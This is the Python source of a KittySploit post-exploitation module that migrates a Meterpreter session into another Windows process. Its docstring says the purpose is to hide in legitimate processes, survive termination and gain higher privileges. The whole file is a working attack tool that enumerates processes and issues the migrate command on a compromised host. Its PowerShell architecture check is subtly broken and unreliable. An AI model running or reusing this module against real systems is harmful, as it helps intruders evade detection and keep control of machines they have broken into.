#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
import re

class Module(Post):
    """Windows Process Migration Module
    
    Migrates the Meterpreter session to a different process.
    This is useful for:
    - Hiding in a legitimate process
    - Escaping from a process that might be terminated
    - Gaining access to a process running with higher privileges
    """
    
    __info__ = {
        "name": "Windows Process Migration",
        "description": "Migrates the Meterpreter session to a different process",
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER],
    }
    
    def __init__(self):
        super().__init__()
        self.session_id = OptString("", "Session ID", True)
        self.pid = OptInteger(0, "Target Process ID (0 to list processes)", False)
        self.process_name = OptString("", "Target process name (e.g., explorer.exe)", False)
        self.arch = OptEnum("auto", "Target architecture", False, ["auto", "x86", "x64"])
    
    def _get_session_id_value(self) -> str:
        """Return the current session_id option value as a string."""
        value = ""
        try:
            value = getattr(self, 'session_id', '') or ""
        except Exception:
            value = ""
        if hasattr(value, 'value'):
            value = value.value
        return str(value or "").strip()
    
    def _is_meterpreter_session(self) -> bool:
        """Check if the session is a meterpreter session"""
        session_id_value = self._get_session_id_value()
        if not session_id_value or not self.framework or not hasattr(self.framework, 'session_manager'):
            return False
        
        session = self.framework.session_manager.get_session(session_id_value)
        if session:
            session_type = getattr(session, 'session_type', '') or ''
            return session_type.lower() == SessionType.METERPRETER.value.lower()
        return False
    
    def _execute_cmd(self, command: str) -> str:
        """Execute a meterpreter command"""
        if not command:
            return ""
        
        try:
            output = self.cmd_execute(command)
            return output.strip() if output else ""
        except Exception as e:
            print_warning(f"Command execution failed: {str(e)}")
            return ""
    
    def _list_processes(self) -> list:
        """List running processes"""
        print_info("[*] Enumerating running processes...")
        
        # Use meterpreter ps command if available
        ps_output = self._execute_cmd("ps")
        
        processes = []
        if ps_output:
            # Parse ps output (format may vary)
            lines = ps_output.split('\n')
            for line in lines:
                line = line.strip()
                if not line or 'PID' in line or '---' in line:
                    continue
                
                # Try to extract PID and process name
                # Format might be: "1234  explorer.exe  user  ..."
                parts = line.split()
                if len(parts) >= 2:
                    try:
                        pid = int(parts[0])
                        name = parts[1]
                        processes.append({'pid': pid, 'name': name, 'line': line})
                    except ValueError:
                        continue
        
        # Fallback to tasklist if ps doesn't work
        if not processes:
            print_info("[*] Using tasklist as fallback...")
            tasklist_output = self._execute_cmd("shell tasklist /fo csv /nh")
            if tasklist_output:
                for line in tasklist_output.split('\n'):
                    line = line.strip()
                    if not line:
                        continue
                    # CSV format: "explorer.exe","1234","Session","0","12345 K"
                    try:
                        # Simple parsing - find PID (second quoted field)
                        matches = re.findall(r'"([^"]+)"', line)
                        if len(matches) >= 2:
                            name = matches[0]
                            pid = int(matches[1])
                            processes.append({'pid': pid, 'name': name, 'line': line})
                    except (ValueError, IndexError):
                        continue
        
        return processes
    
    def _get_process_info(self, pid: int) -> dict:
        """Get information about a specific process"""
        print_info(f"[*] Getting information for process {pid}...")
        
        # Use meterpreter getpid to check current PID
        current_pid_output = self._execute_cmd("getpid")
        current_pid = None
        if current_pid_output:
            try:
                # Extract PID from output like "Current pid: 1234"
                pid_match = re.search(r'(\d+)', current_pid_output)
                if pid_match:
                    current_pid = int(pid_match.group(1))
            except ValueError:
                pass
        
        # Get process details
        ps_output = self._execute_cmd("ps")
        process_info = {'pid': pid, 'name': 'unknown', 'arch': 'unknown', 'user': 'unknown'}
        
        if ps_output:
            for line in ps_output.split('\n'):
                if str(pid) in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        process_info['name'] = parts[1]
                    break
        
        # Try to determine architecture
        # Check if process is 64-bit (requires additional checks)
        arch_check = self._execute_cmd(f"shell powershell -Command \"Get-Process -Id {pid} | Select-Object -ExpandProperty Path | ForEach-Object {{ if ([System.IO.File]::Exists($_)) {{ $pe = [System.Reflection.Assembly]::LoadFile($_); if ($pe.ImageRuntimeVersion -like '*64*') {{ Write-Output 'x64' }} else {{ Write-Output 'x86' }} }} }}\"")
        if arch_check and ('x64' in arch_check or 'x86' in arch_check):
            process_info['arch'] = 'x64' if 'x64' in arch_check else 'x86'
        
        return process_info
    
    def _migrate_to_process(self, target_pid: int) -> bool:
        """Migrate to a target process"""
        print_info(f"[*] Attempting to migrate to process {target_pid}...")
        
        # Get current PID
        current_pid_output = self._execute_cmd("getpid")
        current_pid = None
        if current_pid_output:
            try:
                pid_match = re.search(r'(\d+)', current_pid_output)
                if pid_match:
                    current_pid = int(pid_match.group(1))
            except ValueError:
                pass
        
        if current_pid == target_pid:
            print_warning(f"[!] Already running in process {target_pid}")
            return True
        
        # Get process info
        proc_info = self._get_process_info(target_pid)
        print_info(f"[*] Target process: {proc_info['name']} (PID: {target_pid}, Arch: {proc_info['arch']})")
        
        # Use meterpreter migrate command
        migrate_result = self._execute_cmd(f"migrate {target_pid}")
        
        # Check if migration succeeded
        if migrate_result:
            if "successfully" in migrate_result.lower() or "migrated" in migrate_result.lower():
                print_success(f"[+] Successfully migrated to process {target_pid} ({proc_info['name']})")
                
                # Verify new PID
                new_pid_output = self._execute_cmd("getpid")
                if new_pid_output:
                    print_info(f"[*] Current PID: {new_pid_output}")
                
                return True
            elif "error" in migrate_result.lower() or "failed" in migrate_result.lower():
                print_error(f"[!] Migration failed: {migrate_result}")
                return False
            else:
                # Assume success if no error message
                print_success(f"[+] Migration command executed")
                print_info(f"[*] Result: {migrate_result}")
                return True
        else:
            # No output - might be success or might need to check
            print_warning("[!] No output from migrate command")
            print_info("[*] Checking current PID...")
            new_pid_output = self._execute_cmd("getpid")
            if new_pid_output:
                try:
                    pid_match = re.search(r'(\d+)', new_pid_output)
                    if pid_match:
                        new_pid = int(pid_match.group(1))
                        if new_pid == target_pid:
                            print_success(f"[+] Successfully migrated to process {target_pid}")
                            return True
                        else:
                            print_warning(f"[!] Still in process {new_pid}, migration may have failed")
                            return False
                except ValueError:
                    pass
            
            print_warning("[!] Could not verify migration status")
            return False
    
    def _find_process_by_name(self, name: str) -> list:
        """Find processes by name"""
        processes = self._list_processes()
        matching = []
        
        name_lower = name.lower()
        for proc in processes:
            if name_lower in proc['name'].lower():
                matching.append(proc)
        
        return matching
    
    def run(self):
        """Run the migration module"""
        try:
            session_id_value = self._get_session_id_value()
            
            if not session_id_value:
                raise ProcedureError(FailureType.ConfigurationError, "Session ID is required")
            
            if not self._is_meterpreter_session():
                raise ProcedureError(FailureType.ConfigurationError, "This module requires a Meterpreter session")
            
            print_info("")
            print_success("Starting Process Migration Module...")
            print_info("=" * 70)
            
            # Get options
            pid_value = self.pid.value if hasattr(self.pid, 'value') else int(self.pid) if self.pid else 0
            process_name_value = self.process_name.value if hasattr(self.process_name, 'value') else str(self.process_name) if self.process_name else ""
            arch_value = self.arch.value if hasattr(self.arch, 'value') else str(self.arch) if self.arch else "auto"
            
            target_pid = None
            
            # If PID is 0 or not specified, list processes
            if pid_value == 0 and not process_name_value:
                print_info("[*] No target specified, listing processes...")
                processes = self._list_processes()
                
                if not processes:
                    print_error("[!] Could not enumerate processes")
                    return False
                
                print_info("")
                print_info("Available processes:")
                print_info("-" * 70)
                print_info(f"{'PID':<10} {'Process Name':<30} {'Arch':<10}")
                print_info("-" * 70)
                
                for proc in processes[:50]:  # Show first 50
                    arch = proc.get('arch', 'unknown')
                    print_info(f"{proc['pid']:<10} {proc['name']:<30} {arch:<10}")
                
                if len(processes) > 50:
                    print_info(f"... and {len(processes) - 50} more processes")
                
                print_info("")
                print_info("[*] Use 'set pid <PID>' or 'set process_name <name>' to specify target")
                return False
            
            # Find target process
            if process_name_value:
                print_info(f"[*] Searching for process: {process_name_value}")
                matching = self._find_process_by_name(process_name_value)
                
                if not matching:
                    print_error(f"[!] No process found matching '{process_name_value}'")
                    return False
                
                if len(matching) == 1:
                    target_pid = matching[0]['pid']
                    print_info(f"[*] Found process: {matching[0]['name']} (PID: {target_pid})")
                else:
                    print_info(f"[*] Found {len(matching)} matching processes:")
                    for i, proc in enumerate(matching[:10]):
                        print_info(f"  [{i+1}] PID {proc['pid']}: {proc['name']}")
                    
                    if len(matching) > 10:
                        print_info(f"  ... and {len(matching) - 10} more")
                    
                    # Use first match
                    target_pid = matching[0]['pid']
                    print_info(f"[*] Using first match: PID {target_pid}")
            else:
                target_pid = pid_value
            
            if not target_pid:
                print_error("[!] No target process specified")
                return False
            
            # Verify process exists
            proc_info = self._get_process_info(target_pid)
            if proc_info['name'] == 'unknown':
                print_warning(f"[!] Process {target_pid} may not exist or may not be accessible")
                response = input("[?] Continue anyway? (y/N): ")
                if response.lower() != 'y':
                    return False
            
            # Architecture check
            if arch_value != "auto" and proc_info['arch'] != 'unknown':
                if proc_info['arch'] != arch_value:
                    print_warning(f"[!] Architecture mismatch: target is {proc_info['arch']}, requested {arch_value}")
                    response = input("[?] Continue anyway? (y/N): ")
                    if response.lower() != 'y':
                        return False
            
            # Perform migration
            print_info("=" * 70)
            success = self._migrate_to_process(target_pid)
            
            print_info("=" * 70)
            if success:
                print_success("[+] Process migration completed successfully!")
                print_info("[*] Session is now running in the target process")
            else:
                print_error("[!] Process migration failed")
                print_info("[*] The session may still be active in the original process")
            
            return success
            
        except ProcedureError as e:
            raise e
        except Exception as e:
            raise ProcedureError(FailureType.Unknown, f"Migration error: {str(e)}")
